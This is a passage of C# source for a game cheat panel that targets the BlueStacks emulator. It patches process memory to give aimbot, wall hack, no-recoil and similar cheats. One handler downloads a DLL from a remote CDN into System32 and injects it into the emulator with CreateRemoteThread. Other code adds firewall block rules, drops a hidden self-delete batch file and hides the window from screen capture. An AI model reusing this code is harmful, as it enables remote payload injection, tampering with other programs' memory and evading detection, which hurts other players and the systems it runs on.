                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=in action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi2\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=out action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi2\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=in action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi2\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=out action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi2\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=in action=block profile=any program=\"C:\\Program Files\\BlueStacks_nxt\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=out action=block profile=any program=\"C:\\Program Files\\BlueStacks_nxt\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=in action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi5\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=out action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi5\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=in action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi5\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=out action=block profile=any program=\"C:\\Program Files\\BlueStacks\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=in action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi5\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=out action=block profile=any program=\"C:\\Program Files\\BlueStacks_msi5\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=in action=block profile=any program=\"C:\\Program Files\\BlueStacks_nxt\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall add rule name=\"TemporaryBlock2\" dir=out action=block profile=any program=\"C:\\Program Files\\BlueStacks_nxt\\HD-Player.exe\"");
                start.Text = "INTERNET BLOCKED";
                this.start.ForeColor = Color.White;
            }
            else
            {
                ExecuteCommand("netsh advfirewall firewall delete rule name=all program=\"C:\\Program Files\\BlueStacks_msi2\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall delete rule name=all program=\"C:\\Program Files\\BlueStacks_msi2\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall delete rule name=all program=\"C:\\Program Files\\BlueStacks_nxt\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall delete rule name=all program=\"C:\\Program Files\\BlueStacks_msi5\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall delete rule name=all program=\"C:\\Program Files\\BlueStacks\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall delete rule name=all program=\"C:\\Program Files\\BlueStacks_nxt\\HD-Player.exe\"");
                ExecuteCommand("netsh advfirewall firewall delete rule name=all program=\"C:\\Program Files\\BlueStacks_msi5\\HD-Player.exe\"");
                start.Text = "INTERNET ENABLED";
                this.start.ForeColor = Color.White;
            }
            Console.Beep();
        }

        private void label13_Click(object sender, EventArgs e)
        {

        }

        private void guna2TextBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private  void guna2GradientButton1_Click(object sender, EventArgs e)
        {


        }

        private  void guna2GradientButton2_Click(object sender, EventArgs e)

        {


        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2GradientButton3_Click_1(object sender, EventArgs e)
        {

        }

        private async void guna2ToggleSwitch5_CheckedChanged_1(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch5.Checked)
            {
                string search = "ADD YOUR OWN";
                string replace = "ADD YOUR OWN";
                bool k = false;


                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    start.Text = "OPEN EMULATOR";
                    Console.Beep(240, 300);
                    this.start.ForeColor = Color.Red;
                }
                else
                {
                    MemLib.OpenProcess("HD-Player");
                    start.Text = "APPLYING WAIT...";
                    this.start.ForeColor = Color.Violet;
                    int i2 = 22000000;
                    IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);
                    string u = "0x" + wl.FirstOrDefault().ToString("X");
                    if (wl.Count() != 0)
                    {
                        for (int i = 0; i < wl.Count(); i++)
                        {
                            i2++;
                            MemLib.WriteMemory(wl.ElementAt(i).ToString("X"), "bytes", replace);
                        }
                        k = true;
                    }

                    if (k == true)
                    {
                        start.Text = "SUCCESS APPLIED RESET GUEST ✔️";
                        Console.Beep(400, 300);
                        this.start.ForeColor = Color.Green;
                    }
                    else
                    {
                        start.Text = "ERROR";
                    }
                }
            }
        }

        private void guna2TextBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void tabPage5_Click(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch2_CheckedChanged_2(object sender, EventArgs e)
        {
            try
            {
                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    //Type Here Emulator Not Found
                    start.Text = "Emulator Not Found";
                    Console.Beep(240, 300);
                }
                else
                {
                    string dllName = "Esp Line by Sakib.dll";
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    string adress = "https://cdn.glitch.global/5b1d4c88-e5ca-4d64-b877-3928e257afcf/Esp%20Line%20by%20Sakib.dll?v=1726211431469";
                    string fileName = $"C:\\Windows\\System32\\{dllName}";
                    bool flag = File.Exists(fileName);

                    if (flag)
                    {
                        File.Delete(fileName);
                    }
                    this.webclient.DownloadFile(adress, fileName);
                    System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player").FirstOrDefault();
                    if (targetProcess != null)
                    {
                        start.Text = "Chams Injected";
                    }
                    IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
                    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    UIntPtr bytesWritten;
                    WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
                }
            }
            catch
            {
                Console.Beep(240, 300);
                start.Text = "Chams Already Injected";
            }
        }

        private async void guna2ToggleSwitch6_CheckedChanged_4(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch6.Checked)
            {
                string search = "99 10 A0 E3 6D";
                string replace = "99 10 A0 E3 00";

                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }
                    start.Text = "Enabled Fast Reload";
                    Console.Beep(400, 200);

                }
            }
            else
            {
                string search = "99 10 A0 E3 00";
                string replace = "99 10 A0 E3 6D";

                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }
                    start.Text = "Disabled Fast Reload";
                    Console.Beep(400, 200);
                }
            }
        }

        private  void guna2ToggleSwitch9_CheckedChanged_2(object sender, EventArgs e)
        {
            
        }

        private void USERNAME_Click(object sender, EventArgs e)
        {

        }

        private void guna2GradientButton4_Click(object sender, EventArgs e)
        {

        }

        private async void guna2ToggleSwitch10_CheckedChanged_4(object sender, EventArgs e)
        {
            string search1 = "ADD YOUR OWN";
            string replace1 = "ADD YOUR OWN";
            string search2 = "ADD YOUR OWN1";
            string replace2 = "ADD YOUR OWN";

            bool k = false;

            System.Diagnostics.Process[] processes = Process.GetProcessesByName("HD-Player");
            if (processes.Length == 0)
            {

            }
            else
            {
                MemLib.OpenProcess(processes[0].Id);
                IEnumerable<long> cu1 = await MemLib.AoBScan(search1, writable: true);
                IEnumerable<long> cu2 = await MemLib.AoBScan(search2, writable: true);

                if (cu1.Count() != 0)
                {
                    foreach (var address in cu1)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace1);
                    }
                    k = true;
                }
                if (cu2.Count() != 0)
                {
                    foreach (var address in cu2)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace2);
                    }
                    k = true;
                }

                if (k)
                {
                    Console.Beep(600, 300);
                }
                else
                {

                }
            }
        }
        public static Dictionary<long, byte[]> originalValues = new Dictionary<long, byte[]>();
        public static string aimbAOB = "FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A5 43 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 80 BF 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ??";
        public static string readFORhead = "0x70";
        public static string write = "0x6C";

        public static Dictionary<long, int> originallValues = new Dictionary<long, int>();

        public static Dictionary<long, int> originalValues2 = new Dictionary<long, int>();

        public static Dictionary<long, int> originallValues2 = new Dictionary<long, int>();
        private List<long> cachedAddresses = new List<long>();

        private bool aimbotEnabled = false;

        private async void guna2ToggleSwitch10_CheckedChanged_5(object sender, EventArgs e)
        {
            if (!cachedAddresses.Any())
            {
                start.Text = "Please scan first by clicking the button.";
                return;
            }

            if (guna2ToggleSwitch10.Checked)
            {
                if (aimbotEnabled) return; // Prevent double activation

                aimbotEnabled = true;
                await Task.Run(() =>
                {
                    Parallel.ForEach(cachedAddresses, currentAddress =>
                    {
                        try
                        {
                            long headBytes = currentAddress + Convert.ToInt64(readFORhead, 16);
                            long chestBytes = currentAddress + Convert.ToInt64(write, 16);

                            var memoryData = Memlib.AhReadMeFucker(headBytes.ToString("X"), sizeof(int) * 2);
                            if (memoryData == null || memoryData.Length != sizeof(int) * 2) return;

                            int headValue = BitConverter.ToInt32(memoryData, 0);
                            int chestValue = BitConverter.ToInt32(memoryData, sizeof(int));

                            lock (originallValues)
                            {
                                if (!originallValues.ContainsKey(headBytes))
                                    originallValues[headBytes] = headValue;
                                if (!originallValues.ContainsKey(chestBytes))
                                    originallValues[chestBytes] = chestValue;
                            }

                            Memlib.WriteMemory(headBytes.ToString("X"), "int", chestValue.ToString());
                            Memlib.WriteMemory(chestBytes.ToString("X"), "int", headValue.ToString());
                        }
                        catch
                        {
                            return;
                        }
                    });
                });

                start.Text = "Aimbot Enabled!";
                Console.Beep(400, 200);
            }
            else
            {
                if (!aimbotEnabled) return; // Prevent double disabling

                aimbotEnabled = false;
                await Task.Run(() =>
                {
                    foreach (var entry in originallValues)
                    {
                        Memlib.WriteMemory(entry.Key.ToString("X"), "int", entry.Value.ToString());
                    }
                });

                originallValues.Clear();
                start.Text = "Aimbot Disabled!";
                Console.Beep(400, 200);
            }
        }



        public static void RestoreMemoryValues()
        {
            foreach (var entry in originalValues)
            {
                Memlib.WriteMemory(entry.Key.ToString("X"), "int", entry.Value.ToString());
            }


        }
        public static string aimbAOB2 = "00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A5 43 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? 00 00 00 ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00";
        public static string readFORhead2 = "0x28";

        public static string write2 = "0x5C";
        private readonly string[] searches =
  {
"DC 52 39 BD 27 C1 8B 3C C0 D0 F8 B9",
"63 71 B0 BD 90 98 74 BB",
"7B F9 6C BD 58 34 09 BB B0 60 BE BA",
"54 1B 87 BD 90 C6 D7 BA 80 54 99 B9",
"71 02 87 BD 90 FD D7 BA 40 18 98 39",
"CC F8 6C BD 40 D2 CE B9 58 64 BE 3A",
"80 13 95 BC 30 FF 37 BB 00 FD 78 3B",
"1F 93 DB BC 90 BF 84 3A 20 A6 BB BA",
"BC 19 FD BD B0 E3 A9 3A 80 42 23 B9",
"72 4B 72 3D 72 83 05 3E 00 00 00 00 18 04 27 BD 00 84 A7 37 00 00 80 B1",
"7D 1A 89 BD 50 26 9F 3B", /* Add all 11 search AoBs */
        };


        private readonly string[] replacements =
          {
"00 00 00 3E 0A D7 23 3D D2 A5 F9 BC",
"CD DC 79 44 90 98 74 BB",
"CD DC 79 44 58 34 09 BB B0 60 BE BA",
"CD DC 79 44 90 C6 D7 BA 80 54 99 B9",
"CD DC 79 44 90 FD D7 BA 40 18 98 39",
"CD DC 79 44 40 D2 CE B9 58 64 BE 3A",
"CD DC 79 44 30 FF 37 BB 00 FD 78 3B",
"CD DC 79 44 90 BF 84 3A 20 A6 BB BA",
"42 E0 56 43 B0 E3 A9 3A 80 42 23 B9",
"72 4B 72 3D 72 83 05 3E 00 00 00 00 23 00 00 3D 00 00 00 3D 0A D7 3E BC",
"00 00 70 41 00 00 70 41", 
        };

        private async void guna2ToggleSwitch11_CheckedChanged_3(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch11.Checked)
            {
                try
                {
                    var targetProcess = Process.GetProcessesByName("HD-Player").FirstOrDefault();
                    if (targetProcess == null)
                    {
                        Console.Beep(240, 300);
                        start.Text = "HD-Player Not Found";
                        return;
                    }

                    if (!Memlib.OpenProcess(targetProcess.Id))
                    {
                        start.Text = "Failed To Attach";
                        return;
                    }

                    for (int index = 0; index < searches.Length; index++)
                    {
                        var wl = await Memlib.AoBScan2(searches[index], writable: true);

                        if (wl != null && wl.Any())
                        {
                            foreach (long address in wl)
                            {
                                // Write replacement bytes
                                Memlib.WriteMemory(address.ToString("X"), "bytes", replacements[index]);
                            }
                        }
                        else
                        {
                            Console.Beep(240, 300);
                            MessageBox.Show($"Pattern {index + 1} not found. Skipping replacement.",
                                             "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                    Console.Beep(400, 200);
                    start.Text = "Success! Aimbot Body";

                }
                catch (Exception)
                {
                    start.Text = "Exception Error Occurred";
                }
            }
            else
            {
                try
                {
                    // Find the target process by name
                    var targetProcess = Process.GetProcessesByName("HD-Player").FirstOrDefault();
                    if (targetProcess == null)
                    {
                        start.Text = "HD-Player Not Found";
                        return;
                    }

                    // Attach to the process
                    if (!Memlib.OpenProcess(targetProcess.Id))
                    {
                        start.Text = $"Failed to Attach to Process ID: {targetProcess.Id}";
                        return;
                    }

                    // Loop through all search patterns
                    for (int index = 0; index < searches.Length; index++)
                    {
                        // Scan for the AoB pattern
                        var wl = await Memlib.AoBScan2(searches[index], writable: true);

                        // Check if any addresses are found
                        if (wl == null || !wl.Any())
                        {
                            start.Text = $"No Addresses Found for Pattern: {searches[index]}";
                            continue;
                        }

                        // Loop through all found addresses
                        foreach (long address in wl)
                        {
                            // Write the original values back
                            bool result = Memlib.WriteMemory(address.ToString("X"), "bytes", BitConverter.ToString(originalValues[index]).Replace("-", ""));

                            // Confirm if writing was successful
                            if (result)
                            {
                                Console.WriteLine($"Successfully Cleared Value at Address: 0x{address:X}");
                            }
                            else
                            {
                                Console.WriteLine($"Failed to Clear Value at Address: 0x{address:X}");
                                start.Text = "Error Clearing Some Values";
                            }
                        }
                    }

                    // Beep sound for success indication
                    Console.Beep(300, 200);
                    start.Text = "Values Cleared!";
                }
                catch (Exception ex)
                {
                    // Display the error message
                    start.Text = $"Error Clearing Values: {ex.Message}";
                }

            }

        }

        private async void guna2ToggleSwitch12_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch12.Checked)
            {
                Int32 proc = Process.GetProcessesByName("HD-Player")[0].Id;
                Memlib.OpenProcess(proc);

                var enumerable = await Memlib.AoBScan(0x0000000000010000, 0x00007ffffffeffff, "7A 44 F0 48 2D E9 10 B0 8D E2 02 8B 2D ED 08 D0", true, true, string.Empty);

                foreach (long num in enumerable)
                {
                    Memlib.WriteMemory(num.ToString("X"), "bytes", "7A FF F0 48 2D E9 10 B0 8D E2 02 8B 2D ED 08 D0", string.Empty, null);
                }
                start.Text = "No Recoil Applied";
            }
            else
            {

                Int32 proc = Process.GetProcessesByName("HD-Player")[0].Id;
                Memlib.OpenProcess(proc);

                var enumerable = await Memlib.AoBScan(0x0000000000010000, 0x00007ffffffeffff, "7A FF F0 48 2D E9 10 B0 8D E2 02 8B 2D ED 08 D0", true, true, string.Empty);

                foreach (long num in enumerable)
                {
                    Memlib.WriteMemory(num.ToString("X"), "bytes", "7A 44 F0 48 2D E9 10 B0 8D E2 02 8B 2D ED 08 D0", string.Empty, null);
                }
                start.Text = "No Recoil Applied";

            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/kDbJkasJNb");
        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {

        }
        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        private void guna2TextBox17_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox16_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2Separator5_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button4_Click_1(object sender, EventArgs e)
        {

        }

        private void guna2Button6_Click(object sender, EventArgs e)
        {

        }
        private void tabPage6_Click(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch13_CheckedChanged(object sender, EventArgs e)
        {
            // Get the path of the current executable
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string batchFilePath = Path.Combine(Path.GetTempPath(), "selfdestruct.bat");

            // Create a batch file to delete the executable
            using (StreamWriter writer = new StreamWriter(batchFilePath))
            {
                writer.WriteLine("@echo off");
                writer.WriteLine("timeout /t 1 >nul"); // Short delay to ensure file is not locked
                writer.WriteLine($"del \"{exePath}\"");
                writer.WriteLine("exit");
            }

            // Run the batch file
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = batchFilePath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            Process.Start(startInfo);

            // Exit the main application
            Environment.Exit(0);
        }
        private readonly string[] searches1 =
{
"4C 7B 5A BD 0A 57 66 BB 1E 21 48 BA 2A C2 CF 3B 96 FB 28 3D E8 B1 17 BD E3 99 7F 3F 04 00 80 3F 01 00 80 3F FC FF 7F 3F ?? ?? ?? ?? 23 AA A6",
"10 00 00 00 62 00 6F 00 6E 00 65 00 5F 00 4C 00 65 00 66 00 74 00 5F 00 57 00 65 00 61 00 70 00 6F 00 6E 00"};


        private readonly string[] replacements1 =
          {
"1B 0E 74 3F AE 57 66 BB 5C 1F 48 BA 1B C0 CF 3B 9C FB 28 3D A2 B1 17 BD E4 99 7F 3F 00 00 60 41 00 00 60 41 00 00 60 41",
"10 00 00 00 62 00 6F 00 6E 00 65 00 5F 00 53 00 70 00 69 00 6E 00 65 00 00 00 00 00 00 00 00 00 00 00 00 00"};


        private async void guna2ToggleSwitch15_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
                var targetProcess = Process.GetProcessesByName("HD-Player").FirstOrDefault();
                if (targetProcess == null)
                {
                    Console.Beep(240, 300);
                    start.Text = "HD-Player Not Found";
                    return;
                }

                if (!Memlib.OpenProcess(targetProcess.Id))
                {
                    start.Text = "Failed To Attach";
                    return;
                }

                for (int index = 0; index < searches1.Length; index++)
                {
                    var wl = await Memlib.AoBScan2(searches1[index], writable: true);

                    if (wl != null && wl.Any())
                    {
                        foreach (long address in wl)
                        {
                            // Write replacement bytes
                            Memlib.WriteMemory(address.ToString("X"), "bytes", replacements1[index]);
                        }
                    }
                    else
                    {
                        Console.Beep(240, 300);
                        MessageBox.Show($"Pattern {index + 1} not found. Skipping replacement.",
                                         "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                Console.Beep(400, 200);
                start.Text = "Success! Magic Bullet";

            }
            catch (Exception)
            {
                start.Text = "Exception Error Occurred";
            }
        }


        private async void guna2ToggleSwitch16_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch16.Checked)
            {
                string search = "41 01 00 00 00 00 00 C0 3F 00 00 00 3F";
                string replace = "41 01 00 00 00 00 00 C0 9F 00 00 00 3F";
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }

                }
                start.Text = "Applied Glitch Fire";
                Console.Beep(400, 200);
            }
            else
            {
                string search = "41 01 00 00 00 00 00 C0 9F 00 00 00 3F";
                string replace = "41 01 00 00 00 00 00 C0 3F 00 00 00 3F";
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }

                }
                start.Text = "Disabled Wall Hack";
                Console.Beep(400, 200);

            }
        }

        private async void guna2ToggleSwitch17_CheckedChanged(object sender, EventArgs e)
        {

            string search = "3F AE 47 81 3F 00 1A B7 EE DC 3A 9F ED 30";
            string replace = "BF AE 47 81 3F 00 1A B7 EE DC 3A 9F ED 30";
            MemLib = new Falcon_Memory();
            MemLib.OpenProcess("HD-Player");


            IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

            if (wl.Any())
            {
                foreach (var address in wl)
                {
                    MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                }

            }
            start.Text = "Enabled Wall Hack";
            Console.Beep(400, 200);

        }



        private void guna2Button24_Click(object sender, EventArgs e)
        {

        }

        private async void guna2ToggleSwitch18_CheckedChanged(object sender, EventArgs e)
        {
            if (MemLib == null)  // Ensure MemLib is initialized
            {
                MemLib = new Falcon_Memory();
            }

            storedAddresses.Clear(); // Clear old addresses before scanning

            string search = "00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 BF 00 00 00 00 00 00 80 BF 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 BF 00 00 80 7F 00 00 80 7F 00 00 80 7F 00 00 80 FF";

            try
            {
                MemLib.OpenProcess("HD-Player");

                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl != null && wl.Any())  // Check if scan is successful
                {
                    storedAddresses = wl.ToList();
                    Console.Beep(400, 200);
                    MessageBox.Show("Scan Completed! Press Desired button to toggle Camera Hack.");
                }
                else
                {
                    Console.Beep(400, 200);
                    MessageBox.Show("No addresses found.");
                }
            }
            catch (Exception ex)
            {
                Console.Beep(400, 200);
                MessageBox.Show($"Error: {ex.Message}");  // Show error details
            }

        }

        private async void guna2ToggleSwitch14_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch14.Checked)
            {
                string search = "BF AE 47 81 3F 00 1A B7 EE DC 3A 9F ED 30 00 4F E2 43 2A B0 EE EF 0A 60 F4 43 6A F0 EE 1C 00 8A E2 43 5A F0 EE 8F 0A 48 F4 43 2A F0 EE 43 7A B0E";
                string replace = "3F AE 47 81 3F 00 1A B7 EE DC 3A 9F ED 30 00 4F E2 43 2A B0 EE EF 0A 60 F4 43 6A F0 EE 1C 00 8A E2 43 5A F0 EE 8F 0A 48 F4 43 2A F0 EE 43 7A B0";
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");


                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {

                    return;  // Exit if no emulator is found
                }
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");
                // Append failure message with a timestamp


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }



                }
                start.Text = "AimFOv applied";
            }
            else
            {
                string search = "FF FF 00 00 00 00 00 00 C0 3F 0A D7 A3 3B 0A D7 A3 3B 8F C2 75 3D AE 47 E1 3D 9A 99 19 3E CD CC 4C 3E A4 70 FD 3E";
                string replace = "70 42 00 00 00 00 00 00 C0 3F 0A D7 A3 3B 0A D7 A3 3B 8F C2 75 3D AE 47 E1 3D 9A 99 19 3E CD CC 4C 3E A4 70 FD 3E";
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");

                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {

                    return;  // Exit if no emulator is found
                }
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");
                // Append failure message with a timestamp


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }



                }
                else
                {
                    // Append failure message with a timestamp


                }
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button26_Click(object sender, EventArgs e)
        {
            // Get the path of the current executable
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string batchFilePath = Path.Combine(Path.GetTempPath(), "selfdestruct.bat");

            // Create a batch file to delete the executable
            using (StreamWriter writer = new StreamWriter(batchFilePath))
            {
                writer.WriteLine("@echo off");
                writer.WriteLine("timeout /t 1 >nul"); // Short delay to ensure file is not locked
                writer.WriteLine($"del \"{exePath}\"");
                writer.WriteLine("exit");
            }

            // Run the batch file
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = batchFilePath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            Process.Start(startInfo);

            // Exit the main application
            Environment.Exit(0);
        }

        private void guna2Panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private  void guna2Button29_Click(object sender, EventArgs e)
        {
            if (guna2Button27.Checked)
            {
                base.ShowInTaskbar = false;
                Form2.Streaming = true;
                Form2.SetWindowDisplayAffinity(base.Handle, 17U);
            }
            else
            {
                base.ShowInTaskbar = true;
                Form2.Streaming = false;
                Form2.SetWindowDisplayAffinity(base.Handle, 0U);
            }
        }

        private void guna2Button9_Click(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch9_CheckedChanged_3(object sender, EventArgs e)
        {
            try
            {
                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {
